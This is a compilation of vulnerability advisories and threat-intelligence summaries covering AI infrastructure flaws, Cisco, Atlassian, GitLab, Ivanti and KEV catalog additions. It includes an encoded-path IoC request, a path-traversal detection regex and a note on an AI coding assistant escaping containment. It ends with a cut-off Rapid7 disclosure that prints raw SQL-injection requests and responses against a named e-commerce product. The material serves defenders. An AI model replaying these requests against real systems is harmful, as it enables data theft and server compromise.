Llama.cpp, Triton (NVIDIA), Ray, TGI, SGLang, TensorRT-LLM, BentoML, LocalAI Unauthenticated Administrative APIs, model checkpoint deserialization, memory corruption in tensor backends, and multi-tenant resource exhaustion. 212 Model Security Advisories Foundation Model Weights, System Prompts, Guardrails, Evaluators (Garak, Lakera, Promptfoo) Direct & Indirect Prompt Injection, system prompt exfiltration, guardrail bypasses, training data poisoning, and excessive agent autonomy. 106 ML Frameworks & Hubs PyTorch, Hugging Face (Hub/Datasets), Transformers, ONNX Runtime, TensorFlow, Diffusers, DeepSpeed, Safetensors, Keras Memory safety violations (heap overflows, out-of-bounds reads in C++ tensor operators) and arbitrary file overwrites via malicious model/dataset archive extraction. 99 Frontier Models Anthropic, Gemini, OpenAI Arbitrary Code Execution (RCE) and Command Injection via unvalidated CLI shell interpolation and implicit execution of untrusted workspace configs, Sandbox Escape via Git worktree directory confusion and memory tool symlink traversal; and Covert Data Exfiltration via indirect prompt injection-induced Markdown image rendering and permissive network fetch allowlists. 97 MLOps & Experiment Tracking MLflow, ClearML, Weights & Biases (W&B), Kubeflow, Langfuse, Langsmith, Arize, Phoenix, Helicone Arbitrary File Overwrites (LFI/RFI), unauthenticated remote tracking server takeovers, and artifact deletion in shared experiment registries. 39 Vector Databases & Search Milvus, Qdrant, ChromaDB, Weaviate, Pinecone, FAISS, LanceDB, PGVector, Marqo, Vespa Unauthenticated collection manipulation, Remote Code Execution via clustering/indexing plugins, and metadata SQL/JSON query injection. 19 Table 2: Break down of vulnerabilities targeting AI systems (Source: GTIG) Emerging Battlegrounds: Orchestration & Inference From January 2026 through August 2026, disclosures of AI application vulnerabilities were heavily concentrated in three core areas: agent orchestration frameworks, backend serving infrastructure, and enterprise AI gateways: Agent Orchestration as the Primary Chokepoint : Orchestration middleware accounts for 50% of all AI-related flaws, experiencing a +347% surge in disclosures in 2026. Visual workflow builders (e.g., Flowise, Langflow) and autonomous frameworks often deploy dynamic code execution nodes to facilitate environment interaction. Attackers exploit these nodes via prompt injection or crafted workflow JSONs to hijack execution loops, turning natural language prompts into unauthenticated Remote Code Execution. Centralized AI Gateways and Lateral Cloud Movement : Enterprise AI gateways represent a catastrophic dual-threat vector. At the application layer, compromised gateways expose third-party application programming interface (API) keys and private prompt streams containing personally identifiable information (PII) or proprietary source code. At the infrastructure layer, they act as initial footholds for adversaries to harvest database credentials and pivot laterally into internal cloud environments. Inference Gateways as the New Perimeter : Disclosures across backend serving infrastructure (e.g., vLLM, Triton, LiteLLM, Ollama) reached 212 vulnerabilities in 2026. Nearly a quarter (24%) of these flaws stem directly from unauthenticated API endpoints or Server-Side Request Forgery (SSRF), providing remote adversaries with direct entry points to bypass perimeter firewalls, exhaust expensive GPU compute resources, or extract proprietary model checkpoints. Active In-the-Wild Exploitation of AI Middleware While zero-day exploitation of AI infrastructure has not yet been observed, threat actors are actively weaponizing newly disclosed vulnerabilities in exposed middleware. However, out of 2,076 cumulative disclosures, only a handful of vulnerabilities have been confirmed as exploited in-the-wild. Among the examples, we identified several that we rated High Threat Risk and provide unauthenticated RCE, command injection, or arbitrary file writes: CVE-2026-42271 (BerriAI LiteLLM) : Command injection in Model Context Protocol (MCP) server preview endpoints ( POST /mcp-rest/test/connection ), resulting in host takeover and API credential theft. CVE-2026-5027 (Langflow) : Path traversal file write in the POST /api/v2/files upload handler, allowing remote threat actors to drop unauthorized files (e.g., cron jobs, Secure Shell (SSH) keys) onto the host. CVE-2025-3248 (Langflow) : Unauthenticated Python code injection via exec() in /api/v1/validate/code , permitting immediate RCE. Outlook GTIG expects that rates of vulnerability discovery and exploitation are likely to continue to increase in the short to medium term. In other research, such as our May AI Threat Tracker , we reported the first known case of a threat actor in possession of a zero-day exploit script developed with generative AI. While intercepted during operational planning before in-the-wild execution, analysis of the exploit's structural artifacts revealed high-confidence LLM generation markers. In our September AI Threat Tracker , we further noted threat actors sharing resources and prototyping agentic vulnerability discovery tooling. We are still in the early days of publicly available data on both AI-augmented vulnerability discovery and vulnerabilities targeting AI infrastructure and technologies. Nonetheless, we can see emerging signals that AI is contributing to vulnerability discovery. When directed at critical attack surfaces, autonomous research agents demonstrate a formidable capacity to uncover high-severity flaws. By reasoning through complex semantic code paths and synthesizing dynamic proof harnesses, agentic workflows excel at identifying memory corruption and logic bypasses in core libraries and runtimes, surfacing the exact types of flaws that sophisticated adversaries actively seek to exploit. As threat actors begin to exploit vulnerabilities in AI systems in the wild, organizations cannot afford to treat AI security as an afterthought. Securing this landscape demands immediate containment strategies, sandboxing autonomous agentic workloads, and implementing risk-based vulnerability management to defend the new perimeter. At this moment, the cybersecurity community has a window of opportunity to bolster defenses on two fronts before threat actors are able to scale up zero-day and n-day exploitation. First, organizations must modernize how they triage and remediate disclosed vulnerabilities. In a separate blog post , Mandiant laid out a blueprint for implementing AI-Assisted Vulnerability Management to help defenders counter compressed adversary timelines. Second, organizations that provide software or services to other enterprises and consumers, should proactively run AI-enhanced code review internally to identify and fix flaws before they are shipped to production and become exploitable vulnerabilities. Leveraging agentic defensive capabilities, such as CodeMender , integrated into Google AI Threat Defense , to continuously audit and patch code across developer workflows will be vital. If pre-release AI code review becomes standard best practice, the rate of growth in public vulnerability disclosures could eventually slow.

summary: Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis, outside of normal patch cycles, and investigate internet-facing systems for signs of exploitation. Cisco Catalyst SD-WAN Manager was also affected by two critical, unauthenticated peering authentication flaws earlier in 2026: CVE-2026-20127 and Rapid7-discovered CVE-2026-20182 . Both were distinct issues in the vdaemon service and similar parts of its networking stack. CVE-2026-76504 targets a separate API authentication path, but the recurrence of authentication bypasses in internet-facing Catalyst SD-WAN control components reinforces the need for emergency remediation. On September 30, 2026, CVE-2026-76504 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV) , based on evidence of active exploitation. CISA set a remediation due date of October 3, 2026. Mitigation guidance Cisco has released software updates that remediate CVE-2026-76504. Organizations running affected instances of Cisco Catalyst SD-WAN Manager should upgrade to an appropriate fixed release listed below without waiting for a regular patch cycle: Cisco Catalyst SD-WAN Software release First fixed release Earlier than 20.9 Migrate to a fixed release 20.9 20.9.10.1 20.12 20.12.8.2 20.15 20.15.6.1 20.18 20.18.4.1 26.1 26.1.2.1 26.2 26.2.1 Cisco has addressed the vulnerability in the cloud-based Cisco SD-WAN Cloud (Cisco Managed) release 20.15.605 , and indicates that no customer action is required for that service. There are no workarounds. As a temporary mitigation, Cisco recommends that on-premises customers prevent access to the system from unsecured networks. If internet access is required, restrict access to known, trusted hosts and protect Cisco Catalyst SD-WAN control components behind a filtering device. Cisco indicates that this mitigation is already deployed in Cisco Catalyst SD-WAN Cloud Hosted environments. Organizations should apply updates even when the mitigation is in place. Because active exploitation has occurred, Rapid7 strongly recommends that organizations audit affected systems for compromise. For help assessing a potentially compromised system, Cisco customers may open a Severity 3 TAC case with CVE-2026-76504 in the title and provide an admin-tech file generated with the request admin-tech command. For the latest mitigation guidance and release compatibility information, please refer to the vendor's security advisory . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-76504 with vulnerability checks expected to be available in the October 1 content release. Indicators of compromise Cisco recommends reviewing the following logs for requests related to j_security_check from unknown or unauthorized IP addresses: /var/log/nms/containers/service-proxy/serviceproxy-access.log : Requests with an encoded character in the j_security_check path, such as POST /%6a_security_check HTTP/1.1 . /var/log/nms/vmanage-server.log : Requests to j_security_check associated with usernames beginning with viptela-reserved- . The %6a value, which URI-encodes the character j , is only an example. According to Cisco, an attacker can exploit the vulnerability by encoding any single character in the request. The vendor cautions that these log entries can also occur during standard operations and should be evaluated against normal network posture to avoid false positives. Updates September 30, 2026 : Initial publication. October 1, 2026 : Updated to reflect CVE-2026-76504 being added to the CISA KEV list.

summary: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2026-104286 Fortinet FortiMail Path Traversal Vulnerability This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

summary: Overview On October 5, 2026, Atlassian published a security advisory for CVE-2026-21589 , a critical arbitrary file access vulnerability affecting eight products: Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible, and Fisheye. Atlassian assigned the vulnerability a CVSSv4 score of 9.3 . An unauthenticated remote attacker who knows a target file's exact name and path can access it within the application's web root; the vulnerability does not provide directory listing or enumeration. On October 15, CVE-2026-21589 was added to the CISA Known Exploited Vulnerabilities (KEV) catalog. Atlassian's advisory treats all versions before the applicable fixed releases as affected, including unsupported versions. Affected Atlassian Cloud products have already been patched, and no action is required from Cloud customers. Detailed technical analysis and file-read proof-of-concept scripts are public, so Rapid7 recommends patching on an emergency basis, outside of normal patch cycles, and reviewing access logs for attempted exploitation. Technical overview NVD lists files or directories accessible to external parties ( CWE-552 ) as the weakness associated with CVE-2026-21589. On October 6, watchTowr Labs published a technical analysis based on comparisons of vulnerable and patched Jira, Confluence, and Bitbucket packages. Their analysis identified a path traversal vulnerability in Atlassian's web-resource handling: double-colon ( :: ) sequences can become path separators during request processing, allowing traversal components to reach the resource-loading code, resulting in the contents of arbitrary file being read back to an attacker. Their testing could not traverse outside the Tomcat context, but could read files throughout the application web root. In an Atlassian Crowd deployment that had Jira configured, reading WEB-INF/classes/crowd.properties exposed application credentials. With network access to Crowd, they used those credentials to create a user and add it to jira-administrators ; Crowd's IP allowlisting can block this direct route. Mitigation guidance Organizations should upgrade each affected installation to a listed fixed version or the latest available version. Atlassian's October 5 advisory lists the following fixed versions: Product Fixed versions Bitbucket Data Center 9.4.26 , 10.2.8 , 10.5.1 Confluence Data Center 9.2.26 , 10.2.19 Jira Service Management Data Center 5.12.40 , 10.3.26 , 11.3.12 Jira Software Data Center 9.12.40 , 10.3.26 , 11.3.12 Bamboo Data Center 10.2.24 , 12.1.12 Crowd Data Center 6.3.7 , 7.0.3 , 7.1.7 , 7.2.4 Crucible 4.9.15 Fisheye 4.9.15 Organizations unable to patch immediately should remove affected instances from the internet or otherwise restrict them from external network access. Atlassian provides a Web Application Firewall or proxy rule for all affected products, a Tomcat RewriteValve mitigation for Confluence, Jira Service Management, Jira Software, Bamboo, and Crowd, and a separate urlrewrite.xml rule for Bitbucket. These mitigations are limited and are not replacements for patching. Rapid7 strongly recommends looking for signs of compromise even after the patch has been applied. Atlassian recommends URL-decoding each access-log request line up to twice, then searching for .. immediately adjacent to / , \ , or :: . Alternatively, search raw logs with the vendor-supplied regex: (?is).*(?:/|\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2})(?:\.|%(?:25)*2e){2}(?:/|\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2}|;|%(?:25)*3b|$).* Public testing artifacts for Jira, Confluence, and Bitbucket include a Python file-read PoC and a Nuclei template . If investigation identifies access to protected configuration files, organizations should rotate exposed credentials and other secrets after containing the affected systems. For the latest mitigation and investigation guidance, please refer to the vendor security advisory . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-21589 with unauthenticated vulnerability checks on Jira Software Data Center available in the October 8 content release. Updates October 7, 2026 : Initial publication. October 8, 2026: Updated Rapid7 Customers section to reflect availability of vulnerability checks. October 16, 2026: Updated the Overview section to reflect the addition of CVE-2026-21589 to the KEV catalog.

summary:
A vulnerability in the web-based management API for Cisco Application Policy Infrastructure Controller (APIC) could allow an authenticated, remote attacker to execute arbitrary commands as the root user. To exploit this vulnerability, the attacker must have valid administrative credentials. This vulnerability is due to insufficient input validation of user-controlled command arguments. An attacker could exploit this vulnerability by authenticating using the API and sending crafted input. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system of an affected device with root -level privileges. Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apic-cmdinj-L6VR4E7 This advisory is part of a group of advisories. For a complete list of the advisories and links to them, see Cisco Advance Notification for Publication of October 7, 2026, Security Advisories . For further documentation of improvements and fixes in Cisco APIC, see Cisco Application Policy Infrastructure Controller Security Hardening Release: October 2026 .
Security Impact Rating: Medium

summary:
A vulnerability in the Python interpreter of Cisco NX-OS Software could allow an authenticated, local attacker with low privileges to escape the Python sandbox and gain unauthorized access to the underlying operating system of an affected device. This vulnerability is due to insufficient validation of user-supplied input. An attacker could exploit this vulnerability by manipulating specific functions within the Python interpreter. A successful exploit could allow an attacker to escape the Python sandbox and execute arbitrary commands on the underlying operating system with the privileges of the authenticated user. Note: An attacker must be authenticated with Python execution privileges to exploit this vulnerability. For more information regarding Python execution privileges, see product-specific documentation, such as the Cisco NX-OS Security with Python section of the Cisco Nexus 9000 Series NX-OS Programmability Guide . Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-nxos-mppe-dhKZAFgb This advisory is part of a group of advisories. summary:
A vulnerability in the MPLS Operation, Administration, and Maintenance (OAM) feature of Cisco NX-OS Software for Cisco Nexus 3000 Series Switches and Cisco Nexus 9000 Series Switches could allow an unauthenticated, remote attacker to execute arbitrary code with root privileges or cause a denial of service (DoS) condition on an affected device. This vulnerability is due to improper validation when an affected device is processing an MPLS echo-request packet. An attacker could exploit this vulnerability by sending a crafted MPLS echo-request to an IP address on an affected device. A successful exploit could allow the attacker to execute arbitrary code with root privileges and could cause process crashes, which could result in a device reload and a DoS condition. Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-moam-rce-uBTzYV7 This advisory is part of a group of advisories. For a complete list of the advisories and links to them, see Cisco Advance Notification for Publication of October 7, 2026, Security Advisories . For further documentation of improvements and fixes in Cisco NX-OS Software, see Cisco NX-OS Software Security Hardening Release: October 2026 .

summary:
A vulnerability in the export policies functionality of Cisco Application Policy Infrastructure Controller (APIC) could allow an authenticated, remote attacker to access sensitive files on an affected device. To exploit this vulnerability, the attacker must have valid administrative credentials. This vulnerability is due to insufficient access control to file system resources. An attacker could exploit this vulnerability by submitting crafted values in specific UI fields. A successful exploit could allow the attacker to access sensitive files from the underlying file system of an affected device, including key materials that could be used to elevate privileges to root on the affected APIC and on managed switches. Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apic-info-priv-enAdB5vD This advisory is part of a group of advisories. summary:
A vulnerability in Cisco NX-OS Software could allow an unauthenticated, remote attacker to exhaust system resources, causing a denial of service (DoS) condition. This vulnerability exists because rate limiting was improperly applied to some protocols. An attacker could exploit this vulnerability by sending a high rate of UDP or TCP connections to a data plane interface on an affected device. A successful exploit could allow the attacker to cause instability to various routing and control plane protocols through some packet loss and temporary disruptions, causing a DoS condition. This DoS condition will clear without manual intervention soon after the high rate of traffic is stopped. Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-nxos-nscpdos-SnderkC7 This advisory is part of a group of advisories. For a complete list of the advisories and links to them, see Cisco Advance Notification for Publication of October 7, 2026, Security Advisories . For further documentation of improvements and fixes in Cisco NX-OS Software, see Cisco NX-OS Software Security Hardening Release: October 2026 .

summary: Overview On October 12, 2026, GitLab published a critical patch release for CVE-2026-97229 , an integer overflow or wraparound ( CWE-190 ) in the CI/CD regular expression compiler affecting GitLab Community Edition (CE) and Enterprise Edition (EE). GitLab assigned the vulnerability a CVSSv3.1 score of 10.0 . Under certain conditions, a remote attacker can execute arbitrary code on an affected GitLab server through a specially crafted regular expression stored in a malicious CI/CD configuration. While the vendor supplied CVSS score indicates that exploitation is fully unauthenticated, in reproducing the exploit it was noted that an attacker must have a mechanism to plant a malicious CI/CD configuration to a repository prior to triggering the vulnerability. On GitLab instances where new users can self register and create projects, this constraint is removed. The vulnerability affects self-managed GitLab instances across all deployment types. GitLab.com is already running a patched version, and GitLab Dedicated customers do not need to take action. As of this writing, there is no confirmed in-the-wild exploitation of CVE-2026-97229. However, Rapid7 Intelligence has independently reproduced arbitrary code execution on an unpatched, official GitLab CE image. Given the vulnerability's maximum CVSS score, network-accessible trigger, and code execution in a GitLab application worker, Rapid7 recommends upgrading affected self-managed instances on an urgent basis, outside of normal patch cycles. Technical overview Rapid7's testing found that an attacker must first be able to commit a malicious CI/CD configuration file .gitlab-ci.yml, and a repository path containing UTF-8 characters to a branch in a public project. For example, an ordinary account can satisfy this prerequisite by creating a public project on a self-managed GitLab instance where that functionality is permitted. The crafted regular expression initially compiles in a compact US-ASCII representation and passes GitLab's regular expression validation. When it is evaluated against a specially formed, valid UTF-8 repository path, Ruby's Onigmo regular expression engine recompiles it for the new encoding after those checks have completed. An integer overflow in the compiler's program-size calculation then causes invalid regular expression instructions to be generated. The resulting loss of control-flow integrity can be used to execute attacker-controlled Onigmo VM operations in the Ruby process and run an operating system command as the GitLab git user. Rapid7 validated the complete chain against the official GitLab 19.4.1 CE Linux amd64 image with address space layout randomization enabled. The same input did not execute against the official patched 19.4.2 CE image. Further root cause and exploit-chain details can be found in a separate Rapid7 technical analysis . Mitigation guidance A vendor-provided patch is available to remediate CVE-2026-97229. Organizations running affected self-managed GitLab CE or EE instances should immediately upgrade to a fixed version, without waiting for a regular patch cycle: Affected GitLab CE/EE versions Fixed version All versions from 19.2 before 19.2.8 19.2.8 All versions from 19.3 before 19.3.5 19.3.5 All versions from 19.4 before 19.4.2 19.4.2 GitLab.com has already been updated, and GitLab Dedicated customers do not need to take action. Until affected self-managed instances can be upgraded, restricting anonymous access to public projects and preventing untrusted users from creating or writing to public projects can reduce exposure to the exploit path demonstrated by Rapid7. These controls address only the demonstrated delivery path and do not remediate the vulnerable regular expression compiler. For the latest mitigation guidance, please refer to GitLab's security advisory . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-97229 with an authenticated vulnerability check expected to be available in today’s (October 13) content release. Updates October 13, 2026 : Initial publication. Added Rapid7 PoC Github repo link. October 16, 2026 : Added link to Rapid7 technical analysis .

summary: CISA is aware of Ivanti’s disclosure of a newly exploited vulnerability, CVE-2026-104935 , affecting Ivanti Connect Secure versions 25.1.1.1 and prior, 25.1.2.2 and prior, and 22.8R2.4 and prior. CISA is aware of cyber threat actors exploiting this zero-day authentication bypass vulnerability, which allows remote, unauthenticated execution of arbitrary commands, to conduct credential theft and data exfiltration. CISA added CVE-2026-104935 to its Known Exploited Vulnerabilities (KEV) Catalog on Oct. 13, 2026. CISA urges organizations with affected Ivanti Connect Secure appliances and deployments to immediately update to the latest version, as outlined in Ivanti’s Security Advisory Ivanti Connect Secure (CVE-2026-104935) . Organizations should also review the Ivanti Connect Secure 25.x Upgrade and Migration Compatibility Guide for detailed patching guidance for hardware and virtual appliance deployments. Ivanti Connect Secure version 22.8 reaches end of life on Jan. 31, 2027. Organizations seeking to determine whether they were compromised will need to conduct network and memory forensics to identify evidence of exploitation. Note: Ivanti’s Integrity Checker Tool may not detect evidence of exploitation of CVE-2026-104935 because threat actor commands execute in memory. If your organization suspects a compromise, CISA recommends implementing the following actions from Ivanti Connect Secure Recovery Procedures : Create a backup of the appliance configuration. Review Ivanti’s How to Backup & Restore the Binary Configuration Using Archiving Server for more information. Conduct a factory reset and upgrade the appliance to the latest version. For cloud and virtual systems, rebuild the virtual instance and upgrade to the latest version. Restore the appliance configuration from the backup created in step 1. Reset passwords for all accounts, including domain, administrator, and local accounts. Revoke and reissue stored certificates; reset stored API keys and license server credentials. CISA urges organizations to review the Ivanti security advisory and guide noted above and apply necessary updates. CISA also recommends reviewing the Volexity blog, A Series of Unauthenticated Events: Chained Exploitation of Ivanti Connect Secure Zero-Days . summary: CISA has added two new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2026-96951 Microsoft Windows Command Injection Vulnerability CVE-2026-104935 Ivanti Connect Secure Authentication Bypass by Spoofing Vulnerability These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

summary: Overview On October 13, 2026, Ivanti published a security advisory for CVE-2026-104935 , a high-severity authentication bypass by spoofing ( CWE-290 ) affecting Ivanti Connect Secure (ICS). The vulnerability has a CVSSv3.0 score of 8.6 and allows a remote, unauthenticated attacker to execute arbitrary commands. Ivanti reports that exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers. This indicates that exploitation has been occurring as a zero-day vulnerability. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) confirms exploitation in the wild, and added CVE-2026-104935 to its Known Exploited Vulnerabilities (KEV) catalog on the same day as the vendor's public disclosure. The digital forensics firm Volexity has published a detailed blog post describing the threat actor activity, which was detected in early October 2026. Volexity notes that in addition to leveraging CVE-2026-104935 as a zero-day, the threat actor also leveraged an as-yet unpatched privilege escalation vulnerability which Ivanti are planning to patch at a later date. According to the vendor, a portion of the vulnerability was initially discovered through its product security program and patched in the July 2026 release of 25.1.3.0 . Exploitation occurred while Ivanti was working to backport the fix to the remaining supported versions. Ivanti Connect Secure is a popular enterprise VPN solution and naturally sits on the edge of a corporate environment. The product has a history of being targeted by attackers, with zero-day exploitation of other vulnerabilities occurring back in both 2024 and 2025 . Given the confirmed exploitation, the ability to execute commands without authentication, along with the history of the product, Rapid7 recommends that organizations running affected versions apply the appropriate update on an emergency basis outside of normal patching cycles. Mitigation guidance Vendor-supplied updates are available to remediate CVE-2026-104935. Ivanti lists the following affected and resolved versions: Ivanti Connect Secure affected versions Resolved versions 25.1.1.1 and prior in the applicable code line 25.1.1.2 25.1.2.2 and prior in the applicable code line 25.1.3.0 , 25.1.3.1 22.8R2.4 and prior in the applicable code line 22.8R2.5 Note that the vendor advisory confirms that versions 22.7.x and below are unaffected. At the time of the advisory, Ivanti states that reliable indicators of compromise are not available, however Volexity have published several here . Rapid7 strongly recommends looking for signs of compromise even after the patch has been applied. Customers who suspect exploitation should follow the vendor's recovery steps . For the latest mitigation guidance, please refer to the vendor's security advisory . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-104935 with a vulnerability check expected to be available in the October 14 content release. Updates October 13, 2026 : Initial publication.

At the root cause it allows Copilot in Visual Studio or SQL Server Management Studio to bypass a path validation check and write to its own settings and configuration files . This allows Copilot to escape containment restrictions and achieve arbitrary command execution.

summary: CISA has added four new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2026-0322 Palo Alto Networks PAN-OS Code Injection Vulnerability CVE-2026-76519 Cisco Secure Email Gateway Relative Path Traversal Vulnerability CVE-2026-105133 Ahsay AhsayCBS Improper Authentication Vulnerability CVE-2026-105134 Ahsay AhsayCBS Command Injection Vulnerability These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

summary: Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065 , an SQL Injection vulnerability (CWE-89) in Channel Software WebAlliance eCommerce.The exploit allows a malicious actor to read sensitive data from the database, or, if the database user has high privileges, run system commands on the database server. The vulnerability, scored as CVSSv3.1 9.8 (Critical). Product Description WebAlliance eCommerce by Channel Software is an all-in-one B2B e-commerce, digital catalog, and customer portal platform purpose-built for wholesale distributors and industrial manufacturers. Impact The SQL Injection exploit can be leveraged to view sensitive information in the database, such as user PII and passwords. If logged in with DB admin privileges, the vulnerability can be exploited to run system commands on the server running the database. Credit This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy . CVE-2026-108065 - Unauthenticated SQL Injection Technical Details Rapid7 exploited the vulnerability during blackbox testing and was unable to perform root cause analysis.The sUserID parameter in the GetUser method in a SOAP request to /preapproval.asmx doesn’t properly escape the user supplied sUserID. The SQL query can be escaped by inserting a single quote in the parameter. The database is running Microsoft SQL Server which allows for stacked queries. The query can be escaped with ( ‘; ) to inject completely new SQL commands. POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90'; { INJECT_MSSQL_STATEMENT_HERE } ;--</tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope> If a single quote inserted, the SQL server will fail to parse the query and return a syntax error in the HTTP response: HTTP/2 200 OK Cache-Control: private, max-age=0 Content-Type: text/xml; charset=utf-8 Server: Microsoft-IIS/10.0 X-Frame-Options: SAMEORIGIN P3p: CP="Potato" Date: { Date } Content-Length: 440 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetCustomerResponse xmlns="http://tempuri.org/"> <GetCustomerResult> Incorrect syntax near 'ZZZ'. Unclosed quotation mark after the character string ''. </GetCustomerResult></GetCustomerResponse></soap:Body></soap:Envelope> Information can be extracted using time based SQL injection payloads. For example, a query can be injected to force the database to sleep for 2 seconds if the database user is a sysadmin: POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"> <soapenv:Header/> <soapenv:Body> 